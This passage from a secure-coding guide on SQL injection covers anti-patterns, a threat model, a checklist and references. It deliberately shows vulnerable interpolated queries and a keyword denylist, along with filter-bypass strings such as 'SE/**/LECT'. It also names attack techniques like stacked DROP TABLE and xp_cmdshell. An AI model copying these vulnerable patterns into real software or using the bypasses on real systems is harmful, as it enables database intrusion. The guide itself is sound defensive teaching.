      status: 'pending'       // server-assigned, not user-controlled
    })
    .select('id')
    .single()

  if (error) {
    logger.error({ event: 'booking.create_failed', user_id: userId, error: error.code })
    throw new DatabaseError('Failed to create booking')
  }

  return { bookingId: data.id }
}

function isValidUUID(value: string): boolean {
  return /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(value)
}

function isValidDate(value: string): boolean {
  if (!/^\d{4}-\d{2}-\d{2}$/.test(value)) return false
  const date = new Date(value)
  return !isNaN(date.getTime())
}

function isValidTimeSlot(value: string): boolean {
  return /^\d{2}:\d{2}(:\d{2})?$/.test(value)
}
```

---

## 14. Anti-Patterns

### Anti-Pattern 1: Escaping instead of parameterizing

```javascript
// WRONG — escaping special characters is not sufficient
function escapeSQL(str) {
  return str.replace(/'/g, "''").replace(/\\/g, '\\\\')
}

const query = `SELECT * FROM users WHERE email = '${escapeSQL(email)}'`
```

**Why it fails:**
- Different databases have different escape requirements
- Encoding attacks can bypass escaping
- You must escape every occurrence — missing one is a vulnerability
- Developers forget to call the escape function

**Correct approach:** Use parameterized queries.

### Anti-Pattern 2: Denylisting SQL keywords

```javascript
// WRONG — attempting to block SQL keywords
function sanitize(input) {
  const blocked = ['SELECT', 'UNION', 'DROP', 'INSERT', 'DELETE', '--', ';']
  let result = input
  for (const keyword of blocked) {
    result = result.replace(new RegExp(keyword, 'gi'), '')
  }
  return result
}
```

**Why it fails:**
- `SE/**/LECT` bypasses the `SELECT` filter
- `SELSELECTECT` → after removing `SELECT` → `SELECT` remains
- Non-obvious SQL keywords exist for every database
- Legitimate user input may contain these words

### Anti-Pattern 3: Client-side validation only

```javascript
// WRONG — validating on client, trusting on server
// client.js
form.addEventListener('submit', (e) => {
  if (emailField.value.includes("'")) {
    e.preventDefault()
    alert('Invalid characters')
  }
})

// server.js — trusts the clean input
app.post('/login', (req, res) => {
  const { email } = req.body  // attacker bypasses client-side validation with curl
  const query = `SELECT * FROM users WHERE email = '${email}'`
})
```

### Anti-Pattern 4: Trusting ORM's safety without understanding escape hatches

```typescript
// Developer thinks TypeORM is always safe
// WRONG — uses .query() without realizing it accepts raw SQL
const result = await dataSource.query(
  `SELECT * FROM users WHERE id = ${req.params.id}`  // VULNERABLE
)
```

### Anti-Pattern 5: Storing sensitive data plaintext for "convenience"

```sql
-- WRONG — storing passwords plaintext
INSERT INTO users (email, password) VALUES ('user@example.com', 'mypassword123')
-- If SQL injection occurs, attacker gets plaintext passwords
```

**Even with secure queries, assume eventual breach. Always hash passwords with bcrypt/argon2id.**

### Anti-Pattern 6: Verbose error messages in production

```javascript
// WRONG — exposing database errors to the client
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,     // "column 'email' does not exist"
    query: err.query,       // The actual SQL query
    stack: err.stack        // Full stack trace
  })
})
```

---

## 15. Threat Model

### Assets

| Asset | Value | Impact if Compromised |
|---|---|---|
| User credentials | Critical | Account takeover, credential stuffing |
| Payment data | Critical | Financial fraud, PCI violation |
| Personal data (PII) | High | GDPR/LGPD breach, identity theft |
| Business data (bookings, orders) | High | Business disruption, competitive damage |
| Admin credentials | Critical | Full system compromise |
| Database structure | Medium | Enables further attacks |

### Threat Actors

| Actor | Motivation | Capability |
|---|---|---|
| Automated scanners | Opportunistic, credential harvesting | Low-medium (run automated tools) |
| Script kiddie | Curiosity, notoriety | Low (uses pre-written tools) |
| Criminal organization | Financial gain | High (custom tools, persistence) |
| Disgruntled employee | Revenge, sabotage | Medium-high (knows the system) |
| Competitor / Nation-state | Espionage | High (targeted, persistent) |

### Attack Scenarios

**Scenario 1: Authentication bypass**
- Vector: Login form
- Type: Classic injection
- Impact: Access to any account
- Likelihood: High (well-known technique)

**Scenario 2: Mass data exfiltration**
- Vector: Search or filter endpoint
- Type: UNION-based or blind
- Impact: All user records, payment data
- Likelihood: Medium (requires discovery of injection point)

**Scenario 3: Admin account takeover**
- Vector: Admin panel login or profile field
- Type: Second-order injection
- Impact: Full system control
- Likelihood: Low-medium (requires chaining)

**Scenario 4: Database destruction**
- Vector: Any writable endpoint
- Type: Stacked queries + DROP TABLE
- Impact: Data loss, service unavailability
- Likelihood: Low (destructive attacks draw attention; mitigated by backups)

**Scenario 5: OS command execution**
- Vector: Any injection point
- Type: OOB + xp_cmdshell / COPY TO PROGRAM
- Impact: Server compromise, lateral movement
- Likelihood: Low (requires high DB privileges)

---

## 16. Performance Considerations

### Prepared Statements and Performance

Prepared statements have a **performance advantage** over regular queries, not a disadvantage:

1. **Parse once, execute many:** The query is parsed and compiled once. Subsequent executions reuse the compiled plan.
2. **Less CPU per query:** No parsing overhead on repeated identical queries.
3. **Optimizer can plan better:** With stable query structure, the optimizer's plan cache is more effective.

```sql
-- PostgreSQL EXPLAIN — prepared statement reuses plan
PREPARE user_by_email AS SELECT * FROM users WHERE email = $1;

EXECUTE user_by_email('alice@example.com');  -- plan created
EXECUTE user_by_email('bob@example.com');    -- plan reused, no parsing
```

**The only performance case where raw SQL may win:** extremely high variability in parameter values and data distribution, where different parameters benefit from different query plans. This is rare and almost never justifies sacrificing security.

### N+1 Problem — Secure Version

```typescript
// VULNERABLE N+1 — makes N+1 database queries
const bookings = await getBookings()
for (const booking of bookings) {
  // This is a new parameterized query per booking — safe but inefficient
  booking.service = await getService(booking.service_id)
}

// SECURE AND EFFICIENT — single JOIN query
const { rows } = await pool.query(`
  SELECT b.id, b.date, b.time_slot, b.status,
         s.title as service_title, s.price as service_price
  FROM bookings b
  JOIN services s ON s.id = b.service_id
  WHERE b.user_id = $1
  ORDER BY b.date DESC
  LIMIT $2
`, [userId, 50])
```

---

## 17. Compliance Mapping

| Control | OWASP | CWE | GDPR | LGPD | NIST SP 800-53 | PCI-DSS | ISO 27001 |
|---|---|---|---|---|---|---|---|
| Parameterized queries | A03:2021 | CWE-89 | Art. 25, 32 | Art. 46 | SI-10 | Req. 6.3.2 | A.14.2.5 |
| Input validation | A03:2021 | CWE-20 | Art. 25 | Art. 46 | SI-10 | Req. 6.3.2 | A.14.2.1 |
| Least privilege DB user | A01:2021 | CWE-284 | Art. 32 | Art. 46 | AC-6 | Req. 7.1 | A.9.4.1 |
| Error message suppression | A05:2021 | CWE-209 | Art. 32 | Art. 46 | SI-11 | Req. 6.4.5 | A.14.1.2 |
| Audit logging | A09:2021 | CWE-778 | Art. 30, 32 | Art. 37, 46 | AU-2, AU-12 | Req. 10.3 | A.12.4.1 |
| WAF deployment | A05:2021 | — | Art. 32 | Art. 46 | SC-7 | Req. 6.4.1 | A.13.1.1 |

---

## 18. Checklist

### Development

- [ ] All database queries use parameterized statements or prepared statements
- [ ] No string concatenation or interpolation in SQL queries
- [ ] ORM escape hatches (`.raw()`, `.literal()`, `$queryRawUnsafe`) are audited
- [ ] Dynamic table/column names use allowlisting
- [ ] Dynamic ORDER BY uses allowlisting
- [ ] Input validation is applied at all external boundaries
- [ ] Database user has minimum required permissions (no superuser, no FILE privilege)
- [ ] Error messages shown to users do not include SQL errors, stack traces, or query text
- [ ] Passwords are hashed with bcrypt (cost ≥12) or argon2id
- [ ] Second-order injection is considered for all data retrieval paths

### Code Review

- [ ] Check every file that imports the database driver or ORM client
- [ ] Search for: `${}`, `+` operator near SQL strings, template literals in query context
- [ ] Search for: `.raw()`, `.execute()`, `.query()`, `text()`, `literal()`
- [ ] Verify that retrieved data is not reused in subsequent queries unsafely
- [ ] Verify that ORM `create()` / `save()` methods have explicit field allowlists
- [ ] Check that ORDER BY and GROUP BY parameters are from a fixed allowlist

### Deployment

- [ ] WAF rules for SQLi are enabled and tuned
- [ ] Database server is not accessible from the internet (only from app servers)
- [ ] Database connection string is in environment variables, not code
- [ ] Database user password is long (≥32 characters), random, and rotated annually
- [ ] Database audit logging is enabled for DDL operations and errors
- [ ] Automated vulnerability scanning (SAST) includes SQLi detection rules
- [ ] DAST scan includes SQLi probing of all endpoints

### Post-Incident

- [ ] Identify the injection point
- [ ] Determine what data was accessed or modified
- [ ] Apply parameterized query fix
- [ ] Rotate database user credentials
- [ ] Assess whether breach notification is required (GDPR: 72 hours; LGPD: reasonable time)
- [ ] Review all similar code paths in the same codebase
- [ ] Add regression test that sends a SQLi probe and verifies it fails

---

## 19. References

### Standards and Frameworks
- [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Query Parameterization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)
- [OWASP ASVS 4.0 — V5: Validation, Sanitization and Encoding](https://owasp.org/www-project-application-security-verification-standard/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-564: SQL Injection: Hibernate](https://cwe.mitre.org/data/definitions/564.html)
- [NIST SP 800-53 Rev 5 — SI-10: Information Input Validation](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)
- [PCI-DSS v4.0 — Requirement 6.3: Security Vulnerabilities](https://www.pcisecuritystandards.org/document_library/)
- [GDPR Article 32 — Security of Processing](https://gdpr-info.eu/art-32-gdpr/)

### Databases
- [PostgreSQL — Parameterized Queries](https://www.postgresql.org/docs/current/libpq-exec.html)
- [MySQL — Prepared Statements](https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html)
- [MSSQL — sp_executesql](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-executesql-transact-sql)

### Tools
- [SQLMap GitHub](https://github.com/sqlmapproject/sqlmap)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net/burp)

### CVEs and Breach Reports
- [CVE-2025-48757 — Supabase RLS Misconfiguration](https://nvd.nist.gov/)
- [Heartland Payment Systems Breach 2009](https://www.pcworld.com/article/528214/the-heartland-breach-what-went-wrong.html)
- [IBM Cost of Data Breach Report 2023](https://www.ibm.com/reports/data-breach)

### Books
- [The Web Application Hacker's Handbook (2nd ed.)](https://www.wiley.com/en-us/The+Web+Application+Hacker%27s+Handbook-p-9781118026472)
- [The Art of Exploitation — Jon Erickson](https://nostarch.com/hacking2.htm)
- [Real-World Bug Hunting — Peter Yaworski](https://nostarch.com/bug-hunting)
